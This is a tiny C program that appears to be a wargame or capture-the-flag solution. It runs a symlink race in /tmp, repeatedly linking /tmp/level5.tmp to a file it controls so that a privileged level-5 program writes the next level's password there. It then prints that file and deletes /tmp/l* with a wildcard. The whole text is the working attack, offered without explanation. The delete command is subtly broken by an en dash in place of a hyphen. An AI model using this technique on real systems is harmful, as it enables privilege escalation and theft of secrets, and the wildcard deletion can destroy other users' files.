#include <unistd.h>

int main( )
{
	int i;
	system("touch /tmp/lvl6pass.txt");
	
	for(i=0; i<=10; i++)
	{
		system("ln -s /tmp/lvl6pass.txt /tmp/level5.tmp");
	}
	system("cat /tmp/lvl6pass.txt");
	system("rm –rf /tmp/l*");
}